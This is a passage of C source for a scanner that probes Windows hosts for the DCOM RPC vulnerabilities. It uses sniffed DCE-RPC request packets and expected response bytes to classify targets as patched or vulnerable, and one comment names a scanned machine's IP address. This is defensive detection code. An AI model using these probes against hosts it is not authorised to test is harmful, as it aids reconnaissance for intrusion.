0x5e, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x5c, 0x00,0x00, 0x00, 0x5c, 0x00, 0x6a, 0x00, 0x69, 0x00, 0x61, 0x00, 0x64, 0x00,0x65, 0x00, 0x76, 0x00, 0x5f, 0x00, 0x78, 0x00, 0x00, 0x00, 0x36, 0x00,0x5c, 0x00, 0x70, 0x00, 0x75, 0x00, 0x62, 0x00, 0x6c, 0x00, 0x69, 0x00,0x63, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x15, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x90, 0x5b, 0x09, 0x00, 0x02, 0x00, 0x00, 0x00,0x01, 0x00, 0x6c, 0x00, 0xc0, 0xdf, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00,0x07, 0x00, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00};// sniffed from dcom2 scanner, when scanning unpatched machineunsigned char expected2_vulnerable[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x04, 0x00, 0x08, 0x80,};// sniffed from dcom2 scanner, when scanning patched machine// you also get this on a machine that doesn't have either dcom patchunsigned char expected2_patched[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x54, 0x01, 0x04, 0x80,};// this came out of one machine, 128.175.214.151// 0000  05 00 03 23 10 00 00 00 20 00 00 00 01 00 00 00   ...#.... .......// 0010  00 00 00 00 00 00 00 00 03 00 01 1c 00 00 00 00   ................// ethereal says it's a dce fault response// nmap says the system is Me, Win 2000, or WinXP// all the following packets were unanswered, or zero length.unsigned char expected2_dce_fault[] = {0x05, 0x00, 0x03};///////////////////////////// third request packet// from dcom1 dcom_scanzunsigned char fear3[] = {0x05, 0x00, 0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,0x65, 0x45, 0x79, 0x65, 0xd0, 0x16, 0xd0, 0x16, 0x00, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xb8, 0x4a, 0x9f, 0x4d,0x1c, 0x7d, 0xcf, 0x11, 0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00};// sniffed from dcom2 scanner, when scanning patched machineunsigned char request3[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0xb0, 0x03, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x98, 0x03, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00,0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x98, 0xe5, 0x14, 0x00, 0x68, 0x03, 0x00, 0x00, 0x68, 0x03, 0x00, 0x00,0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0xa2, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x38, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x38, 0x03, 0x00, 0x00,0x30, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x30, 0x03, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x18, 0x01, 0x8d, 0x00, 0xb8, 0x01, 0x8d, 0x00, 0x00, 0x00, 0x00, 0x00,0x07, 0x00, 0x00, 0x00, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xab, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0xa5, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0xf6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xff, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0xad, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0xaa, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x07, 0x00, 0x00, 0x00,0x60, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x90, 0x00, 0x00, 0x00,0x58, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00,0x30, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x5d, 0x88, 0x9a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xb8, 0x47, 0x0a, 0x00, 0x58, 0x00, 0x00, 0x00, 0x05, 0x00, 0x06, 0x00,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0xcc, 0xcc, 0xcc, 0xcc,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x80, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xba, 0x09, 0x00,0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,0x4d, 0x45, 0x4f, 0x57, 0x04, 0x00, 0x00, 0x00, 0xc0, 0x01, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,0x3b, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x46, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x00,0x01, 0x00, 0x01, 0x00, 0x67, 0x3c, 0x70, 0x94, 0x13, 0x33, 0xfd, 0x46,0x87, 0x24, 0x4d, 0x09, 0x39, 0x88, 0x93, 0x9d, 0x02, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb0, 0x7e, 0x09, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x89, 0x0a, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x00, 0x00, 0x73, 0x00, 0x61, 0x00,0x6a, 0x00, 0x69, 0x00, 0x61, 0x00, 0x64, 0x00, 0x65, 0x00, 0x76, 0x00,0x5f, 0x00, 0x78, 0x00, 0x38, 0x00, 0x36, 0x00, 0x00, 0x00, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc,0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc, 0x58, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xc0, 0x5e, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x5c, 0x00,0x00, 0x00, 0x5c, 0x00, 0x6a, 0x00, 0x69, 0x00, 0x61, 0x00, 0x64, 0x00,0x65, 0x00, 0x76, 0x00, 0x5f, 0x00, 0x78, 0x00, 0x00, 0x00, 0x36, 0x00,0x5c, 0x00, 0x70, 0x00, 0x75, 0x00, 0x62, 0x00, 0x6c, 0x00, 0x69, 0x00,0x63, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x15, 0x00, 0x01, 0x10, 0x08, 0x00,0xcc, 0xcc, 0xcc, 0xcc, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x90, 0x5b, 0x09, 0x00, 0x02, 0x00, 0x00, 0x00,0x01, 0x00, 0x6c, 0x00, 0xc0, 0xdf, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00,0x07, 0x00, 0x55, 0x00, 0x00, 0x00, 0x00, 0x00};// this is what you get when it's doesn't have either patchunsigned char expected3_vulnerable[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x54, 0x01, 0x04, 0x80,};// this is what you get when it's got the first dcom patchunsigned char expected3_patched1[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x04, 0x00, 0x08, 0x80,};// this is what you get when it's got the second dcom patchunsigned char expected3_patched2[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x02, 0x40, 0x00, 0x80,};///////////////////////////// fourth request packet// from dcom1 dcom_scanzunsigned char fear4[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0xc6, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0xae, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x5b, 0x52, 0x65, 0x74, 0x69, 0x6e, 0x61, 0x5d, 0x5b, 0x52, 0x65, 0x74,0x69, 0x6e, 0x61, 0x5d, 0x00, 0x00, 0x00, 0x00, 0x65, 0x45, 0x79, 0x65,0x32, 0x30, 0x30, 0x33, 0x65, 0x45, 0x79, 0x65, 0x32, 0x30, 0x30, 0x33,0x68, 0x0f, 0x0b, 0x00, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x1e, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x5c, 0x00, 0x41, 0x00, 0x00, 0x00,0x5c, 0x00, 0x00, 0x00, 0x63, 0x00, 0x24, 0x00, 0x5c, 0x00, 0x65, 0x00,0x45, 0x00, 0x79, 0x00, 0x65, 0x00, 0x5f, 0x00, 0x32, 0x00, 0x30, 0x00,0x30, 0x00, 0x33, 0x00, 0x5f, 0x00, 0x52, 0x00, 0x65, 0x00, 0x74, 0x00,0x69, 0x00, 0x6e, 0x00, 0x61, 0x00, 0x2e, 0x00, 0x74, 0x00, 0x78, 0x00,0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xb8, 0xeb, 0x0b, 0x00,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x07, 0x00};// sniffed from dcom2 scanner, when scanning vulnerable machine// only issued at vulnerable machine// no fourth packet when scanning patched machine// etheral says it's an "alter context"unsigned char request4[] = {0x05, 0x00, 0x0e, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,0x03, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x28, 0x57, 0x00, 0x00,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0xb8, 0x4a, 0x9f, 0x4d,0x1c, 0x7d, 0xcf, 0x11, 0x86, 0x1e, 0x00, 0x20, 0xaf, 0x6e, 0x7c, 0x57,0x00, 0x00, 0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,};unsigned char expected4[] = {0x05, 0x00, 0x0f, 0x03, 0x10, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00,0x03, 0x00, 0x00, 0x00, 0xd0, 0x16, 0xd0, 0x16, 0x28, 0x57, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00,0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00,};///////////////////////////// fifth request packet// sniffed from dcom2 scanner, when scanning vulnerable machineunsigned char request5[] = {0x05, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x00, 0x9a, 0x00, 0x00, 0x00,0x03, 0x00, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x95, 0x96, 0x95, 0x2a,0x8c, 0xda, 0x6d, 0x4a, 0xb2, 0x36, 0x19, 0xbc, 0xaf, 0x2c, 0x2d, 0xea,0x34, 0xeb, 0x98, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x07, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x5c, 0x00, 0x4d, 0x00, 0x45, 0x00,0x4f, 0x00, 0x57, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x5c, 0x00, 0x48, 0x00, 0x5c, 0x00, 0x48, 0x00, 0x01, 0x00, 0x00, 0x00,0x58, 0xe9, 0x98, 0x00, 0x01, 0x00, 0x00, 0x00, 0x95, 0x96, 0x95, 0x2a,0x8c, 0xda, 0x6d, 0x4a, 0xb2, 0x36, 0x19, 0xbc, 0xaf, 0x2c, 0x2d, 0xea,0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x5c, 0x00,};// this is what you get with no dcom patches,// unfortunately it's also what you get with the dcom 2 patchunsigned char expected5_vulnerable_or_patched2[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00,0x03, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x54, 0x01, 0x04, 0x80,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};// this is what you get from dcom patch 1unsigned char expected5_patched1[] = {0x05, 0x00, 0x02, 0x03, 0x10, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00,0x03, 0x00, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x04, 0x00, 0x08, 0x80,0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};voidtimeout_handler( int info ) {//fprintf( stderr, "timed out\n" );if ( dcomsockfd )close( dcomsockfd );   // have to close it here to abort the connecttimed_out = 1;}// send a packet, and get response// return length of received data, or -1 on errorintexchange_packets( int pktnum, uint32_t ip, int fd, unsigned char *req,int reqlen, unsigned char *resp, int resplen ) {int len;if ( verbose > 1 )printf( "Sending packet %d\n", pktnum );if(send(dcomsockfd, req, reqlen, 0) < 0) {close( dcomsockfd );alarm( 0 );if ( timed_out )printf( "timed out while sending packet %d to %s\n",pktnum, my_inet_ntoa( ip ) );elsefprintf( stderr, "error sending packet %d to %s\n",pktnum, my_inet_ntoa( ip ) );return -1;}if ( ( len = recv( dcomsockfd, resp, resplen, 0 ) ) < 0 ) {close( dcomsockfd );alarm( 0 );if ( timed_out )printf( "timed out while receiving packet %d from %s\n",pktnum, my_inet_ntoa( ip ) );elsefprintf( stderr, "error receiving packet %d from %s\n",pktnum, my_inet_ntoa( ip ) );return -1;}return len;}// scan remote ip for dcom vulnerability// normally doesn't print anything, just errors// verbose = 1 for basic scan result printfs// verbose > 1 for more verbose stuff// return 0 if ok, 1 if vulnerable, -1 if can't connect or can't tell//     0 not vulnerable//     1 does not accept DCE RPC protocol (connection refused)//     2 no response (filtering DCOM port, or not there)//     3 vulnerable to dcom 1 and dcom2//     4 vulnerable to dcom 2 (but patched for dcom1)//     255 can't tell for some other reasonintdcom2_scan( uint32_t ip ) {struct sockaddr_in dest_addr;   /* hold dest addy */unsigned char resp1[1024];unsigned char resp2[1024];unsigned char resp3[1024];unsigned char resp4[1024];unsigned char resp5[1024];unsigned char assoc_group[4];int len1, len2, len3, len4, len5;int vun3 = 0;int i;if ( verbose > 1 )printf( "scanning %s\n", my_inet_ntoa( ip ) );timed_out = 0;signal( SIGALRM, timeout_handler );alarm( dcom_scan_timeout );dcomsockfd = 0;if((dcomsockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {alarm( 0 );if ( timed_out ) {if ( verbose )printf( "%s timed out while getting socket\n",my_inet_ntoa( ip ) );}elsefprintf( stderr, "error getting socket: %s\n", strerror( errno ) );return 255;}bzero( &dest_addr, sizeof( struct sockaddr_in ) );dest_addr.sin_family = AF_INET;dest_addr.sin_port = htons(DEST_PORT);dest_addr.sin_addr.s_addr = ip;if ( verbose > 1 )printf("Connecting to %s\n", my_inet_ntoa( ip ) );if( connect( dcomsockfd, (struct sockaddr *) &dest_addr,sizeof(struct sockaddr) ) < 0 ) {close( dcomsockfd );alarm( 0 );if ( timed_out || errno == ETIMEDOUT ) {if ( verbose )printf( "%s timed out while connecting\n",my_inet_ntoa( ip ) );return 2;}else if ( errno == ECONNREFUSED ) {if ( verbose )printf("%s does not accept DCERPC protocol -- good\n",my_inet_ntoa( ip ) );return 1;   // good, port not open, it's not vulnerable}if ( verbose )printf( "%s connect failed: %s\n", my_inet_ntoa( ip ),strerror( errno ) );return 255;}#if 0// the ms scanner opens a tcp connections, resets it, then opens a second// but it just refused the second connection for me.close( dcomsockfd );if ( verbose > 1 )printf("opening second connection to %s\n", my_inet_ntoa( ip ) );if( connect( dcomsockfd, (struct sockaddr *) &dest_addr,sizeof(struct sockaddr) ) < 0 ) {close( dcomsockfd );alarm( 0 );if ( timed_out ) {if ( verbose )printf( "%s timed out while connecting\n",my_inet_ntoa( ip ) );return 2;}else if ( errno == ECONNREFUSED ) {if ( verbose )printf("%s does not accept DCERPC protocol -- good\n",my_inet_ntoa( ip ) );return 1;   // good, it's not vulnerableif ( verbose )printf( "%s connect failed: %s\n", my_inet_ntoa( ip ),strerror( errno ) );return 255;}#endif// the bind requestlen1 = exchange_packets( 1, ip, dcomsockfd, request1, sizeof(request1),resp1, sizeof( resp1 ) );if ( len1 < 0 )return 255;memcpy( assoc_group, resp1 + 20, 4 );  // need this for packet 4//printf( "association group:\n" );//print_hex( assoc_group, 4 );// packet exchange 2, call_id: 1 opnum: 4 ctx_id: 0len2 = exchange_packets( 2, ip, dcomsockfd, request2, sizeof(request2),resp2, sizeof( resp2 ) );if ( len2 < 0 )return 255;if ( ! memcmp( resp2, expected2_patched,sizeof( expected2_patched ) ) ) {// it's probably either patched for dcom 2, or neigtherif ( verbose > 1 )printf( "response 2 matches expected patched\n" );}else if ( ! memcmp( resp2, expected2_vulnerable,sizeof( expected2_vulnerable ) ) ) {// it's probably patched for dcom 1if ( verbose > 1 )printf( "response 2 matches expected vulnerable\n" );}else if ( ! memcmp( resp2, expected2_dce_fault,sizeof( expected2_dce_fault ) ) ) {// It's a DCE fault response.  I don't know what causes this,// but it seems to ignore any other packets.  So I can't continue.close( dcomsockfd );if ( verbose > 1 )printf( "response 2 matches dce fault\n" );if ( verbose )printf( "%s returns DCE Fault code -- wierd\n",my_inet_ntoa( ip ) );return 255;}else if ( verbose > 1 ) {printf( "Response 2 expected vunerable contents:\n" );print_hex( expected2_vulnerable, sizeof( expected2_vulnerable ) );printf( "Response 2 expected patched contents:\n" );print_hex( expected2_patched, sizeof( expected2_patched ) );printf( "Response 2 received contents:\n" );print_hex( resp2, len2 );for ( i = 0; i < sizeof( expected2_vulnerable ); i++ ) {if ( resp2[ i ] != expected2_vulnerable[ i ] )printf( "    %04x %02x != %02x\n", i, resp2[ i ],expected2_vulnerable[ i ] );}}// packet exchange 3, call_id: 2 opnum: 4 ctx_id: 0len3 = exchange_packets( 3, ip, dcomsockfd, request3, sizeof(request3),resp3, sizeof( resp3 ) );if ( len3 < 0 )return 255;if ( ! memcmp( resp3, expected3_vulnerable,sizeof( expected3_vulnerable ) ) ) {if ( verbose > 1 )printf( "response 3 matches no dcom patches\n" );vun3 = 1;}else if ( ! memcmp( resp3, expected3_patched1,sizeof( expected3_patched1 ) ) ) {if ( verbose > 1 )printf( "response 3 matches patched for dcom 1\n" );vun3 = 1;}else if ( ! memcmp( resp3, expected3_patched2,sizeof( expected3_patched2 ) ) ) {if ( verbose > 1 )printf( "response 3 matches patched for dcom 2\n" );// MS scanner stops here// but I don't really understand these packets//if ( verbose )//    printf( "%s has both dcom patchs -- good\n", my_inet_ntoa( ip ) );//close( dcomsockfd );//return 0;}else if ( verbose > 1 ) {printf( "response 3 does not match any expected packet\n" );printf( "Response 3 received contents:\n" );print_hex( resp3, len3 );for ( i = 0; i < sizeof( expected3_vulnerable ); i++ ) {if ( resp3[ i ] != expected3_vulnerable[ i ] )printf( "    %04x %02x != %02x\n", i, resp3[ i ],expected3_vulnerable[ i ] );}}// packet exchange 4, Alter contextmemcpy( request4 + 20, assoc_group, 4 );memcpy( expected4 + 20, assoc_group, 4 );len4 = exchange_packets( 4, ip, dcomsockfd, request4, sizeof(request4),resp4, sizeof( resp4 ) );if ( len4 < 0 )return 255;else if ( verbose > 1 ) {if ( memcmp( resp4, expected4, sizeof( expected4 ) ) ) {printf( "Response 4 expected contents:\n" );print_hex( expected4, sizeof( expected4 ) );printf( "Response 4 received contents:\n" );print_hex( resp4, len4 );for ( i = 0; i < sizeof( expected4 ); i++ ) {if ( resp4[ i ] != expected4[ i ] )printf( "    %04x %02x != %02x\n", i, resp4[ i ],expected4[ i ] );}}}// packet exchange 5, RemoteActivationlen5 = exchange_packets( 5, ip, dcomsockfd, request5, sizeof(request5),resp5, sizeof( resp5 ) );if ( len5 < 0 )return 255;close(dcomsockfd);if ( ! memcmp( resp5, expected5_patched1,sizeof( expected5_patched1 ) ) ) {if ( verbose > 1 )printf( "response 5 matches patched for dcom1 -- BAD\n" );if ( verbose )printf( "** %s only has 1st dcom patch -- BAD **\n",my_inet_ntoa( ip ) );return 4;}else if ( ! memcmp( resp5, expected5_vulnerable_or_patched2,sizeof( expected5_vulnerable_or_patched2 ) ) ) {if ( verbose > 1 )printf( "response 5 matches either no dcom patches or patched for dcom2\n" );if ( vun3 ) {if ( verbose )printf( "** %s has neither dcom patch -- BAD **\n",my_inet_ntoa( ip ) );return 3;}if ( verbose )printf( "%s has both dcom patchs -- good\n", my_inet_ntoa( ip ) );return 0;}else if ( verbose > 1 ) {printf( "Response 5 expected contents:\n" );print_hex( expected5_vulnerable_or_patched2,sizeof( expected5_vulnerable_or_patched2 ) );printf( "Response 5 received contents:\n" );print_hex( resp5, len5 